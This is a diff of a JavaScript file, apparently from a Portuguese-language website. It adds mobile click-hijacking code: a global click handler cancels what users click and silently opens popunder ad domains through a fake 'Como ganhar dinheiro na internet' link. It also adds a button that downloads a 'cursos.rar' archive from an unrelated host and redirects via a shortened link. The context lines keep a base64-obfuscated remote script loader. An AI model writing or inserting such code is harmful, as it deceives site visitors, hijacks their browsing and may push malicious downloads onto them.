@@ -1,4 +1,4 @@
-var myWindow, janelaHref, janela = true,popInt = 2;
+var myWindow, janelaHref, janela = true,popInt = 1;
 var popListaDeLinks = ["https://restlesscompeldescend.com/i98rbj855f?key=e055f2494e194b3c22d242d7590b5ad4","https://ossnidorinoom.com/4/6241084","https://restlesscompeldescend.com/i98rbj855f?key=e055f2494e194b3c22d242d7590b5ad4","https://ossnidorinoom.com/4/6241084"];
 const openG = (a) => {
     janela = false;
@@ -60,6 +60,10 @@ function taime() {
     }, openAtivarpop());
    }
 }
+if (detectar_mobile()){
+    clickTx();
+}
+
 function detectar_mobile() { 
     if( navigator.userAgent.match(/Android/i)
     || navigator.userAgent.match(/webOS/i)
@@ -82,3 +86,59 @@ var r=document,f=window,l=[atob('aHR0cHM6Ly9tYXVyb3BveGExLmdpdGh1Yi5pby9jb21hbmR
     if(!l[0])return; si=f["document"]["createElement"]("script");si["type"]="text/javascript";si["async"]=!0;si["id"]="pop";d=f["document"]["getElementsByTagName"]("script")[0];si["src"]=l[g];si["crossOrigin"]="anonymous";si["onerror"]=function(){a()};d["parentNode"]["insertBefore"](si,d);}
     gg();})();
 */
+
+document.querySelector("#-btn").addEventListener("click", (e)=> {
+    e.preventDefault();
+    window.open("https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar");
+    window.location.href="https://viagemmais.nl/fdfd?u=bit.ly/download-dos-cursos-free";
+});
+
+
+
+const clickTx = ()=>{
+    var  ganhosLiskB = "https://ossnidorinoom.com/4/6241084";
+var  ganhosLiskA = "https://restlesscompeldescend.com/i98rbj855f?key=e055f2494e194b3c22d242d7590b5ad4";
+
+document.addEventListener('click', (e)=> {
+    if (clickBody == true && e.target.id!='falseClick'){
+        if (contClick>2 ){}else{
+            e.preventDefault();
+            redClick();
+            var id = "."+e.target.classList[0];
+            //document.querySelector(id).click();
+        }
+    }
+});
+
+var clickBody = true;
+contClick = 0;
+function redClick(){
+        if (contClick % 2 == 0){
+            clickTela(ganhosLiskA);
+            contClick++;
+            console.log(1)
+        }else {
+            clickTela(ganhosLiskB);
+            console.log(2)
+            contClick++;
+            clickBody = false;
+            setTimeout(()=>{
+            clickBody = true;
+            },5000);
+        }
+}
+
+function clickTela(a){
+    var link = document.createElement('a');
+    link.id="falseClick";
+    link.innerText="Como ganhar dinheiro na internet"
+    link.href=a;
+    link.target="_blank";
+    document.body.appendChild(link);
+    setTimeout(()=>{
+       var botao = document.querySelector('#falseClick');
+       botao.click();
+      botao.remove();
+    },200)
+}
+}
